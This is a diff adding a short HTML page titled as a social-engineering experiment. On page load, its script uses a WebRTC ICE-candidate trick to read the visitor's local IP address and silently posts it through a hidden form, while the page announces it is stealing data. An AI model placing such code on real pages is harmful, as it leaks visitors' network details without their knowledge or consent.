@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<!-- Please note that this application is not inherently malicious. -->
+<html>
+    <head>
+        <title>An Experiment in Social Engineering</title>
+        <script>
+
+function main() {
+    var findIP = new Promise(r=>{var w=window,a=new (w.RTCPeerConnection||w.mozRTCPeerConnection||w.webkitRTCPeerConnection)({iceServers:[]}),b=()=>{};a.createDataChannel("");a.createOffer(c=>a.setLocalDescription(c,b,b),b);a.onicecandidate=c=>{try{c.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g).forEach(r)}catch(e){}}});
+    
+    findIP.then(
+        function(ip) {
+            document.getElementById("ip").value = ip;
+            document.datum.submit();
+        },
+        function() {
+            document.getElementById("msg").innerHTML = "Something went wrong; you're probably using a sucky browser.";
+        }
+    );
+}
+        </script>
+    </head>
+    <body onload="main()">
+        <!-- If this page doesn't reload within a few seconds, it probably isn't going to. -->
+        <p id="msg">Please be patient while we steal your data...</p>
+        <form name="datum" method="post">
+            <input id="ip" name="ip" type="hidden" />
+        </form>
+    </body>
+</html>
